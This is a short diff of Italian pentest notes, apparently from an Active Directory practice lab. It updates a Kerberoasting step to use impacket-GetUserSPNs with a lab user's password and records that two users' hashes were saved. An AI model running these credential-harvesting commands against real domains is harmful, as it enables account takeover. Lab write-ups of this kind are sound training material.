@@ -62,5 +62,7 @@ impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ### **KERBEROASTING (SPN)**
 Proviamo a vedere se c'è qualche SPN settato e con l'hash in chiaro (Cosa che capita spesso)
 ```bash
-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
+impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
 ```
+![[Pasted image 20230825112141.png]]
+Gli hash di questi due utenti sono stati inseriti nel file kerberoasting
